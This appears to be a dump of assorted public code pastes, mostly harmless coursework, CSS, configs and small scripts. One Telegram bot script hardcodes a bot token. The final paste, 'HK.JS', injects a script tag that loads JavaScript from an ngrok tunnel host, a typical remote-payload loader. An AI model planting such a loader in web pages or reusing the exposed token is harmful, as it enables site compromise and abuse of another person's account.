  font-style: normal;
  font-weight: 400;
}

/* latin-ext */
@font-face {
  font-family: 'Karla';
  font-style: normal;
  font-weight: 500;
  font-display: swap;
  src: url(https://fonts.gstatic.com/s/karla/v31/qkBIXvYC6trAT55ZBi1ueQVIjQTDypqaHUlKd7c.woff2) format('woff2');
  unicode-range: U+0100-02AF, U+0304, U+0308, U+0329, U+1E00-1E9F, U+1EF2-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
}
/* latin */
@font-face {
  font-family: 'Karla';
  font-style: normal;
  font-weight: 500;
  font-display: swap;
  src: url(https://fonts.gstatic.com/s/karla/v31/qkBIXvYC6trAT55ZBi1ueQVIjQTDypqaE0lK.woff2) format('woff2');
  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+0304, U+0308, U+0329, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
}

#rising_home {
  width: 720px;
  height: auto;
  margin: 25px 0 0;
    
}
#rising_home b {
  color: var(--accent);
}
#rising_home .basing {
  width: 100%;
  padding: 35px;
  border: var(--border);
box-sizing: border-box;
}
  #rising_home .bases {
    width: 100%;
   background: var(--background); 
   box-sizing: border-box;
  border: var(--border);
  }
#rising_home .title {
  font: 900 40px/150% Playfair Display;
  color: var(--color);
  text-align: center;
  padding: 10px;
  box-sizing: border-box;
}
#rising_home .title:after {
  content:'';
  display: block;
  margin: 25px auto;
  width: 50%;
  height: 5px;
  background: var(--accent);
  
}
#rising_home .post {
  background: var(--background); 
  font: 500 14px/235% Karla;
  text-align: justify;
  letter-spacing: .5px;
  padding: 20px;
  box-sizing: border-box;
  color: var(--text);
}
#rising_home .postbase {
    background: var(--background); 
    width: 100%;
  padding: 30px;
  box-sizing: border-box;
}
#rising_home .post span {
  background: var(--accent);
  padding: 10px 25px;
  font: 40px Abril Fatface;
  text-transform: uppercase;
  color: var(--color);
  float: left;
  margin: 5px 10px; 
} 
 #rising_home::after {
  display: block;
  content: ""starlight"";
  padding: 5px 10px; 
  font: 10px Consolas;
  text-transform: uppercase;
  opacity: .4;
  font-weight: bold; 
  color: #8c8c8c; }"
eNv33VkD,ia,biaft03,Python,Wednesday 18th of October 2023 08:01:15 AM CDT,"import random

# Definindo os parâmetros
num_bits = 8
individuos = 4
taxa_mutacao = 0.01
taxa_crossover = 0.7
num_geracoes = 5


# Definindo a função objetivo
def fitness(x):
    return x**2 - 3*x + 4


# Função para converter de binário para decimal
def decode(binary):
    return int(''.join(binary), 2) / (2**num_bits - 1) * 20 - 10


# Função de mutação
def mutate(individual):
    for i in range(num_bits):
        if random.random() < taxa_mutacao:
            individual[i] = '1' if individual[i] == '0' else '0'
    return individual


# Função de crossover
def crossover(parent1, parent2):
    if random.random() < taxa_crossover:
        crossover_point = random.randint(1, num_bits - 1)
        child1 = parent1[:crossover_point] + parent2[crossover_point:]
        child2 = parent2[:crossover_point] + parent1[crossover_point:]
        return child1, child2
    else:
        return parent1, parent2


# Função de seleção por torneio
def tournament_selection(population):
    tournament_size = 2
    tournament = random.sample(population, tournament_size)
    tournament.sort(key=lambda x: fitness(decode(x)), reverse=True)
    return tournament[0]


# Inicializando a população
population = [''.join(random.choice(['0', '1']) for _ in range(num_bits)) for _ in range(individuos)]

# Loop de gerações
for generation in range(num_geracoes):
    new_population = []
    for _ in range(individuos // 2):
        parent1 = tournament_selection(population)
        parent2 = tournament_selection(population)
        child1, child2 = crossover(parent1, parent2)
        child1 = mutate(list(child1))
        child2 = mutate(list(child2))
        new_population.extend([child1, child2])
    population = new_population

# Encontrando o melhor indivíduo
best_individual = max(population, key=lambda x: fitness(decode(x)))

# Decodificando o melhor indivíduo para obter o valor de x
x = decode(best_individual)
max_value = fitness(x)

print(f'O valor de x que maximiza a função é aproximadamente {x:.4f} e o valor máximo é aproximadamente {max_value:.4f}.')
"
gykP5GD1,frontend-deployment.yml,QualibreInfo,YAML,Wednesday 18th of October 2023 07:58:12 AM CDT,"apiVersion: apps/v1 # for versions before 1.9.0 use apps/v1beta2
kind: Deployment
metadata:
  name: frontend
  labels:
    app: guestbook
spec:
  selector:
    matchLabels:
      app: guestbook
      tier: frontend
  replicas: 3
  template:
    metadata:
      labels:
        app: guestbook
        tier: frontend
    spec:
      containers:
      - name: php-redis
        image: docker-all.devops.etat-ge.ch/gremz/gb-frontend-8080:v3
        resources:
          requests:
            cpu: 100m
            memory: 100Mi
          limits:
            cpu: 300m
            memory: 500Mi
        env:
        - name: GET_HOSTS_FROM
          value: dns
        ports:
        - containerPort: 8080
"
FcJDpr9e,recording audio,metalni,TypeScript,Wednesday 18th of October 2023 07:52:12 AM CDT,"import { useCallback, useEffect, useRef, useState } from 'react'

export const useRecordAudio = () => {
  const [audioChunks, setAudioChunks] = useState<BlobPart[]>([])
  const [audioUrl, setAudioUrl] = useState<string | null>(null)
  const [audioFile, setAudioFile] = useState<File | null>(null)
  const mediaRecorder = useRef<MediaRecorder | null>(null)

  const checkForPermissionsAndCreateStream = useCallback(async () => {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        if (mediaRecorder.current) {
          return
        }

        const stream = await navigator.mediaDevices.getUserMedia({
          audio: true,
        })

        mediaRecorder.current = new MediaRecorder(stream)
      } catch (err) {
        return null
      }
    }

    return null
  }, [mediaRecorder])

  const startRecording = useCallback(async () => {
    await checkForPermissionsAndCreateStream()
    if (mediaRecorder.current) {
      mediaRecorder.current.start()
    }
  }, [checkForPermissionsAndCreateStream])

  const stopRecording = useCallback(() => {
    if (mediaRecorder.current) {
      mediaRecorder.current.stop()
    }
  }, [])

  useEffect(() => {
    if (mediaRecorder.current) {
      mediaRecorder.current.ondataavailable = (event) => {
        setAudioChunks((prev) => [...prev, event.data])
      }

      mediaRecorder.current.onstop = () => {
        const audioBlob = new Blob(audioChunks, {
          type: 'audio/wav',
        })

        const audioUrlFromRecording = URL.createObjectURL(audioBlob)
        const audioFileFromRecording = new File(
          [audioBlob],
          `recording-${new Date().toLocaleDateString()}.wav`,
        )
        setAudioUrl(audioUrlFromRecording)
        setAudioFile(audioFileFromRecording)

        // Reset audio chunks
        setAudioChunks([])
      }
    }
  }, [audioChunks])

  return {
    audioChunks,
    audioUrl,
    audioFile,
    startRecording,
    stopRecording,
  }
}
"
AGiKhzF5,23401,boyan1324,Python,Wednesday 18th of October 2023 07:45:42 AM CDT,"#1
usd = float(input(""Enter the amount of dollars to convert: ""))
bgn = usd * 1.79549
print (bgn)

#2
from math import pi
from math import floor
radians = float(input(""Enter the radians: ""))
degrees = radians * 180 / pi
#this rounds/floors the degrees so it isnt a decimal
print(floor(degrees))

#3
deposit = int(input(""Enter the deposit: ""))
deposit_term = int(input(""Enter the deposit term: ""))
year_interest = int(input(""Enter the year interest: ""))
total_sum = deposit + deposit_term * (year_interest / 12)
print(total_sum)

#4
pages_all = int(input(""Enter all pages: ""))
pages_for_hour = int(input(""enter the pages for a hour: ""))
days_needed = int(input(""Enter the days needed: ""))
equation = round(pages_all / days_needed / pages_for_hour)
print(equation)

#5
pen_pack_amount = int(input(""Enter the pen pack amount: ""))
marker_pack_amount = int(input(""Enter the marker pack amount: ""))
cleaning_fluid_amount = int(input(""Enter the cleaning fluid amount: ""))
discount = int(input(""Enter the discount: ""))

pen_price = 5.8 * pen_pack_amount
marker_price = 7.2 * marker_pack_amount
cleaning_fluid_price = 1.2 * cleaning_fluid_amount
sum = pen_price + marker_price + cleaning_fluid_price

total =  sum - discount / 100 * sum
print(total)

#6
nylon_p = 1.50
paint_p = 14.50
thinner_p = 5.0
bags_p = 0.40

nylon = int(input(""nylon: "")) + 2
paint = int(input(""paint: "")) * 1.1
thinner = int(input(""thinner: ""))
hours = int(input(""hours: ""))

final_nylon_price = nylon * nylon_p
final_paint_price = paint * paint_p
final_thinner_price = thinner * thinner_p
total = final_nylon_price + final_paint_price + final_thinner_price + bags_p

workers_per_hour = total * 0.3
total_price_workers = workers_per_hour * hours

money_for_rework = total_price_workers + total
print(money_for_rework)

#7
chicken_menu_price = 10.35
fish_menu_price = 12.40
veg_menu_price = 8.15

delivery = 2.50

chicken_menus = int(input(""chicken menus: ""))
fish_menus = int(input(""fish menus: ""))
veg_menus = int(input(""vegetarian menus: ""))

total_menus = chicken_menus * chicken_menu_price + fish_menus * fish_menu_price + veg_menus + veg_menu_price

dessert_price = total_menus * 0.20

total = total_menus + dessert_price + delivery
print(f""{total:.2f}"")

#8
tax = float(input(""Enter the tax: ""))
shoes = tax - (tax * 0.4)
clothes = shoes - (shoes * 0.2)
ball = clothes * 0.25
accessories = ball * 0.2
total = tax + shoes + clothes + ball + accessories
print(f""Pesho has need {total} leva for treaning!"")

#9
length = float(input(""Enter the length: ""))
width = float(input(""Enter the width: ""))
height = float(input(""Enter the height: ""))
percent = float(input(""Enter the percents: "")) / 100
obem = length * width * height
litres_in_pool = obem - obem * percent
print(litres_in_pool)"
JZDmeB9q,Untitled,Jas__,Python,Wednesday 18th of October 2023 07:34:06 AM CDT,"opiskelijatiedot = input(""Opiskelijatiedot: "")
tehtavatiedot = input(""Tehtävätiedot: "")
koepisteetiedot = input(""Koepisteet: "")
 
opiskelijat = {}                                            # !sanakirja opnro avain ja nimi arvona
with open(opiskelijatiedot) as tiedosto:                    # avataan tiedosto
    for rivi in tiedosto:                                   # käydään läpi rivi kerrallaan
        osat = rivi.strip().split("";"")                      # rivi pilkotaan osiin ; avulla, strip poistaa välilyönnit ja rivienvaihdot
        if osat[0] == ""opnro"":                              # skipataan opnro rivi
            continue                                        # siirrytään seuraavaan
        opiskelijat[osat[0]] = f""{osat[1]} {osat[2]}""       # tallennetaan sanakirjaan, opnro avain ja nimet arvona
 
tehtavat = {}                                               # !sanakirja, opnro avain ja arvoina tehtävien summat
with open(tehtavatiedot) as tiedosto:                       # avataan tiedosto
    for rivi in tiedosto:                                   # käydään läpi rivi kerrallaan
        osat = rivi.strip().split("";"")                      # rivi pilkotaan osiin ; avulla, strip poistaa välilyönnit ja rivienvaihdot
        if osat[0] == ""opnro"":                              # skipataan opnro rivi
            continue                                        # siirrytään seuraavaan
        summa = sum(int(osat[i]) for i in range(1, len(osat)))       # lasketaan tehtävien summa, alkaen indeksi 1, koska 0 on opnro
        tehtavat[osat[0]] = summa                                    # tallennetaan sanakirjaan, opnro avain ja summa arvo
 
koepisteet = {}                                             # !sanakirja, opnro avain ja arvona koepisteiden summa
with open(koepisteetiedot) as tiedosto:                     # avataan tiedosto
    for rivi in tiedosto:                                   # käydään läpi rivi kerrallaan
        osat = rivi.strip().split("";"")                      # rivi pilkotaan osiin ; avulla, strip poistaa välilyönnit ja rivienvaihdot
        if osat[0] == ""opnro"":                              # skipataan opnro rivi
            continue                                        # siirrytään seuraavaan
        summa = sum(int(osat[i]) for i in range(1, len(osat)))        # lasketaan kokeiden summa, alkaen indeksi 1, koska 0 on opnro
        koepisteet[osat[0]] = summa                                   # tallennetaan sanakirjaan, opnro avain ja summa arvo
 
def laske_pisteet(tehtavien_maara):
    pisteet = 0
    tehtavia_kokonaismaara = 40
    for i in range(10, 101, 10):
        if tehtavien_maara >= (i / 100) * tehtavia_kokonaismaara:
            pisteet += 1
    return pisteet
 
for nro, nimi in opiskelijat.items():                                         # käydään läpi opiskelijat sanakirjan avaimet ja arvot
    tehtavat_pisteet = tehtavat.get(nro, 0)                                   # haetaan opiskelijoiden tehtävien pisteet   
    koepisteet_pisteet = koepisteet.get(nro, 0)                               # haetaan opiskelijoiden koepisteet
    yhteispisteet = laske_pisteet(tehtavat_pisteet) + koepisteet_pisteet      # luodaan yhteispisteet ylläolevista
 
    if yhteispisteet >= 28:
        arvosana = 5
    elif yhteispisteet >= 24:
        arvosana = 4
    elif yhteispisteet >= 21:
        arvosana = 3
    elif yhteispisteet >= 18:
        arvosana = 2
    elif yhteispisteet >= 15:
        arvosana = 1
    else:
        arvosana = 0
 
    print(f""{nimi} {arvosana}"")"
d72sXW2L,Untitled,kirkarr,Lua,Wednesday 18th of October 2023 07:15:09 AM CDT,"turtle.refuel(64)
while true do
	turtle.dig()
	turtle.forward()
    turtle.digUp()
end"
XrGQyvGd,Untitled,germanfeed,Python,Wednesday 18th of October 2023 07:12:54 AM CDT,"import telebot
from telebot import custom_filters
from telebot import StateMemoryStorage
from telebot.handler_backends import StatesGroup, State


state_storage = StateMemoryStorage()
# Вставить свой токет или оставить как есть, тогда мы создадим его сами
bot = telebot.TeleBot(""6599615179:AAE760E0aKT6snEEwVvFEWU14SMkzuikdLQ"",
                      state_storage=state_storage, parse_mode='Markdown')


class PollState(StatesGroup):
    name = State()
    age = State()


class HelpState(StatesGroup):
    wait_text = State()


text_poll = ""опрос""  # Можно менять текст
text_button_1 = ""Вопрос про самочувствие""  # Можно менять текст
text_button_2 = ""ТГ""  # Можно менять текст
text_button_3 = ""Умскул""  # Можно менять текст
text_button_4 = ""ВК""


menu_keyboard = telebot.types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
menu_keyboard.add(
    telebot.types.KeyboardButton(
        text_poll,
    )
)

menu_keyboard.add(
    telebot.types.KeyboardButton(
        text_button_4,
    )
)

menu_keyboard.add(
    telebot.types.KeyboardButton(
        text_button_1,
    )
)

menu_keyboard.add(
    telebot.types.KeyboardButton(
        text_button_2,
    ),
    telebot.types.KeyboardButton(
        text_button_3,
    )
)


@bot.message_handler(state=""*"", commands=['start'])
def start_ex(message):
    bot.send_message(
        message.chat.id,
        'Привет! Я твой первый бот, давай познакомимся?',  # Можно менять текст
        reply_markup=menu_keyboard)

@bot.message_handler(func=lambda message: text_poll == message.text)
def first(message):
    bot.send_message(message.chat.id, '_Супер! *Ты ведь Герман?*_?')  # Можно менять текст
    bot.set_state(message.from_user.id, PollState.name, message.chat.id)


@bot.message_handler(state=PollState.name)
def name(message):
    with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
        data['name'] = message.text
    bot.send_message(message.chat.id, 'Супер! [Ваш профиль в ВК](https://www.vk.com/germanfeed1/) `верно?`')  # Можно менять текст
    bot.set_state(message.from_user.id, PollState.age, message.chat.id)


@bot.message_handler(state=PollState.age)
def age(message):
    with bot.retrieve_data(message.from_user.id, message.chat.id) as data:
        data['age'] = message.text
    bot.send_message(message.chat.id, 'Спасибо за регистрацию!', reply_markup=menu_keyboard)  # Можно менять текст
    bot.delete_state(message.from_user.id, message.chat.id)


@bot.message_handler(func=lambda message: text_button_1 == message.text)
def help_command(message):
    bot.send_message(message.chat.id, ""Ты как себя чувствуешь?"", reply_markup=menu_keyboard)  # Можно менять текст


@bot.message_handler(func=lambda message: text_button_2 == message.text)
def help_command(message):
    bot.send_message(message.chat.id, ""[Ваш тг](https://t.me/germanfeeq/)?"", reply_markup=menu_keyboard)  # Можно менять текст


@bot.message_handler(func=lambda message: text_button_3 == message.text)
def help_command(message):
    bot.send_message(message.chat.id, ""Бывший ученик Умскул"", reply_markup=menu_keyboard)  # Можно менять текст

@bot.message_handler(func=lambda message: text_button_4 == message.text)
def help_command(message):
    bot.send_message(message.chat.id, ""[Ваш вк](https://www.vk.com/germanfeed1/)?"", reply_markup=menu_keyboard)

bot.add_custom_filter(custom_filters.StateFilter(bot))
bot.add_custom_filter(custom_filters.TextMatchFilter())

bot.infinity_polling()

"
BHdi1N7z,Untitled,d4r10,PHP,Wednesday 18th of October 2023 07:12:27 AM CDT,"<?php
$questions = array(
    ""What is the capital of France?"" => array(
        ""A"" => ""Paris"",
        ""B"" => ""London"",
        ""C"" => ""Berlin""
    ),
    ""Which planet is known as the Red Planet?"" => array(
        ""A"" => ""Earth"",
        ""B"" => ""Mars"",
        ""C"" => ""Venus""
    ),
    ""What is 2 + 2?"" => array(
        ""A"" => ""3"",
        ""B"" => ""4"",
        ""C"" => ""5""
    ),
    ""Which gas do plants absorb from the atmosphere?"" => array(
        ""A"" => ""Oxygen"",
        ""B"" => ""Nitrogen"",
        ""C"" => ""Carbon Dioxide""
    ),
    ""Who wrote 'Romeo and Juliet'?"" => array(
        ""A"" => ""Charles Dickens"",
        ""B"" => ""William Shakespeare"",
        ""C"" => ""Jane Austen""
    )
);

$correctAnswers = array(
    ""What is the capital of France?"" => ""A"",
    ""Which planet is known as the Red Planet?"" => ""B"",
    ""What is 2 + 2?"" => ""B"",
    ""Which gas do plants absorb from the atmosphere?"" => ""C"",
    ""Who wrote 'Romeo and Juliet'?"" => ""B""
);

function displayQuestions($questions) {
    echo '<form method=""post"">';
    foreach ($questions as $question => $answerChoices) {
        echo '<h2>' . $question . '</h2>';
        foreach ($answerChoices as $option => $answer) {
            echo '<input type=""radio"" name=""' . $question . '"" value=""' . $option . '"" required> ' . $answer . '<br>';
        }
    }
    echo '<input type=""submit"" value=""Submit"">';
    echo '</form>';
}

function checkAnswers($questions, $correctAnswers) {
    $score = 0;
    $results = array();
    foreach ($questions as $question => $answerChoices) {
        $selectedAnswer = $_POST[$question];
        $correctAnswer = $correctAnswers[$question];
        if ($selectedAnswer == $correctAnswer) {
            $results[$question] = ""Correct!"";
            $score++;
        } else {
            $results[$question] = ""Incorrect!"";
        }
    }
    $results['Score'] = 'Your score: ' . $score . ' out of ' . count($questions);
    return $results;
}

if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
    $results = checkAnswers($questions, $correctAnswers);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Simple Quiz</title>
</head>
<body>
    <h1>Simple Quiz</h1>
    <?php
    if ($_SERVER[""REQUEST_METHOD""] == ""POST"") {
        echo ""<h2>Results</h2>"";
        foreach ($results as $question => $result) {
            echo ""<p>$question: $result</p>"";
        }
    } else {
        displayQuestions($questions);
    }
    ?>
</body>
</html>
"
NszY1ht3,Calcular IPC Anual,yayopoint,R,Wednesday 18th of October 2023 07:06:04 AM CDT,"library(readxl)
library(readr)
library(tidyverse)
library(magrittr)

link <- ""https://www.ine.gob.cl/docs/default-source/%C3%ADndice-de-precios-al-consumidor/cuadros-estadisticos/series-empalmadas-y-antecedentes-historicos/series-historicas-empalmadas-1928-al-2009/serie-hist%C3%B3rica-empalmada-ipc-general-(%C3%ADndices)-1928---2009.xls""
tmpfile_ipc <- paste0(tempfile(), "".xls"")
download.file(link, tmpfile_ipc, method=""auto"", mode=""wb"")

ipc_historico <- read_excel(tmpfile_ipc, skip=3)

attach(ipc_historico)
# Se calcula Variación Porcentual de IPC Anual de la siguiente forma:
#  100 * (IPC Diciembre - IPC Diciembre año anterior)/IPC Diciembre año anterior
ipc_historico$var_anual <- c(NA, 100*(Diciembre[-1]-Diciembre[-length(Diciembre)])/Diciembre[-length(Diciembre)])
detach(ipc_historico)

ipc_historico %>%
  select(`Año...14`, var_anual) %>%
  rename(anno = Año...14) -> ipc_var_historica

link <- ""https://www.ine.gob.cl/docs/default-source/%C3%ADndice-de-precios-al-consumidor/cuadros-estadisticos/series-empalmadas-y-antecedentes-historicos/series-empalmadas-diciembre-2009-a-la-fecha/serie-hist%C3%B3rica-empalmada-ipc-diciembre-2009-a-la-fecha-xls.xlsx""
tmpfile_ipc <- paste0(tempfile(), "".xlsx"")
download.file(link, tmpfile_ipc, method=""auto"", mode=""wb"")

ipc_actual <- read_excel(tmpfile_ipc, skip=3)

ipc_actual %>%
  filter(Mes == 12) %>%
  rename(anno=Año, indice=Índice) %>%
  select(anno, indice) %$%
  data.frame(anno=anno[-1],
        var_anual=100*(indice[-1]-indice[-length(indice)])/indice[-length(indice)]) ->
  ipc_var_actual

ipc_variacion_anual <- bind_rows(ipc_var_historica, ipc_var_actual)

rm(ipc_actual, ipc_historico, ipc_var_actual, ipc_var_historica,
   link, tmpfile_ipc)
"
yF0dEu76,2_A,Korotkodul,C++,Wednesday 18th of October 2023 07:05:10 AM CDT,"#include <iostream>
#include <stack>
#include <string>

using std::cin;
using std::cout;
using std::stack;
using std::string;

int main() {
  stack<int> bank;
  string str;
  cin >> str;
  int len = str.size();
  int bal = 0;
  bool ok = true;
  for (int i = 0; i < len; ++i) {
    char lt = str[i];
    char pre = '*';
    if (!bank.empty()) {
      pre = bank.top();
    }
    if (lt == ')') {
      bal--;
      if (pre == '(') {
        bank.pop();
      } else {
        ok = false;
        break;
      }
    } else if (lt == ']') {
      bal--;
      if (pre == '[') {
        bank.pop();
      } else {
        ok = false;
        break;
      }
    } else if (lt == '}') {
      bal--;
      if (pre == '{') {
        bank.pop();
      } else {
        ok = false;
        break;
      }
    } else {
      bal++;
      bank.push(lt);
    }
  }
  if (bal != 0) {
    ok = false;
  }
  if (ok) {
    cout << ""YES\n"";
  } else {
    cout << ""NO\n"";
  }
}"
Zzyqgr79,6. hét,Levi0227,C#,Wednesday 18th of October 2023 06:49:58 AM CDT,"namespace _6het
{
    //class Auto
    //{
    //    public string rendszam;
    //    int km;

    //    public Auto()
    //    {
    //        km = 0;
    //    }

    //    public void Megy(int km) 
    //    { 
    //        this.km += km;
    //    }

    //    public int Oraallas() 
    //    { 
    //        return km;
    //    }
    //}



    internal class _6het
    {
        static void Main(string[] args)
        {
            //Auto kocsi1 = new Auto();
            //kocsi1.rendszam = ""AA-BB-123"";
            //Console.WriteLine(kocsi1.rendszam);

            //kocsi1.Megy(10);
            //Console.WriteLine(kocsi1.Oraallas()+""km"");



            //Book b1 = new Book(""szerzo1"", ""cim1"", 2023, 100);
            //Book b2 = new Book(""J.R.R. Tolkien"", ""The Hobbit - or There and Back Again"", 1937, 312);
            //Console.WriteLine(b1.AllData()+""\n""+b2.AllData());



            //Runner r1 = new Runner(""Janos"", 2, 3);
            //Runner r2 = new Runner(""Péter"", 4, 4);
            //Runner r3 = new Runner(""Gábor"", 8, 2);

            //int cel = 30;
            //while (r2.GetDistance() < cel && r1.GetDistance() < cel && r3.GetDistance() < cel)
            //{
            //    Console.Clear();
            //    r1.RefreshDistance(1);
            //    r2.RefreshDistance(1);
            //    r3.RefreshDistance(1);
            //    r1.Show();
            //    r2.Show();
            //    r3.Show();
            //    System.Threading.Thread.Sleep(100);
            //}



            //Caesar c1 = new Caesar(3);

            //string eredeti = ""alma"";
            //string titkositott = c1.Encode(eredeti);
            //string dekodolt = c1.Decode(titkositott);
            //Console.WriteLine(titkositott + ""\n"" + dekodolt);



            Teglalap t1 = new Teglalap(4, 3, ConsoleColor.Yellow);
            t1.Draw(0,0);
        }
    }
}



//Class Book
namespace _6het
{
    internal class Book
    {
        string szerzo;
        string cim;
        int kiadasEve;
        int oldalSzam;

        public Book(string szerzo, string cim, int kiadasEve, int oldalSzam)
        {
            this.szerzo = szerzo;
            this.cim = cim;
            this.kiadasEve = kiadasEve;
            this.oldalSzam = oldalSzam;
        }

        public string AllData()
        {
            return $""{this.szerzo}: {this.cim}, {this.kiadasEve} ({this.oldalSzam} pages)"";
        }
    }
}



//Class Runner
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace _6het
{
    internal class Runner
    {
        string nev;
        int sorszam;
        int sebesseg;
        int tavolsag;

        public Runner(string nev, int sorszam, int sebesseg)
        {
            this.nev = nev;
            this.sorszam = sorszam;
            this.sebesseg = sebesseg;
            this.tavolsag = 0;
        }

        public void RefreshDistance(int mp) 
        {
            tavolsag += sebesseg * mp;
        }

        public void Show() 
        {
            Console.SetCursorPosition(tavolsag, sorszam);
            Console.WriteLine(nev[0]);
        }

        public int GetDistance()
        {
            return tavolsag;
        }
    }
}



//Class Ceasar
namespace _6het
{
    internal class Caesar
    {
        int kulcs;

        public Caesar(int kulcs)
        {
            this.kulcs = kulcs;
        }

        private string TransformMessage(string uzenet, int kulcs)
        {
            string message = """";
            for (int i = 0; i < uzenet.Length; i++)
            {
                int szam = (int)uzenet[i];
                szam += kulcs;
                char betu = (char)szam;
                message += betu;
            }
            return message;
        }

        public string Encode(string uzenet)
        {
            return TransformMessage(uzenet, kulcs);
        }
        public string Decode(string uzenet)
        {
            return TransformMessage(uzenet, -kulcs);
        }
    }
}



//Class teglalap
namespace _6het
{
    internal class Teglalap
    {
        int szelesseg;
        int magassag;
        ConsoleColor szin;

        public Teglalap(int szelesseg, int magassag, ConsoleColor szin)
        {
            this.szelesseg = szelesseg;
            this.magassag = magassag;
            this.szin = szin;
        }

        private int Area()
        {
            return szelesseg * magassag;
        }

        public bool IsValid()
        {
            if (Area() > 0)
            { return true; }
            //else { return false; }
            return false;
        }

        public void Draw(int x, int y)
        {
            string C = ""@"";
            Console.ForegroundColor = szin;

            string[,] negyzet = new string[magassag, szelesseg - 1];
            Console.SetCursorPosition(0, x);

            for (int i = 0; i < negyzet.GetLength(0); i++)
            {
                for (int c = 0; c < y; c++) Console.Write("" "");

                for (int j = 0; j <= negyzet.GetLength(1); j++)
                {
                    Console.Write(C);  
                }
                Console.WriteLine();
            }
        }
    }
}"
0f5xyTAy,HK.JS,malefoy,HTML,Wednesday 18th of October 2023 06:47:52 AM CDT,"var script = document.createElement('script');
script.src = 'https://6d80-185-176-222-169.ngrok-free.app/HK.JS';
document.head.appendChild(script);"
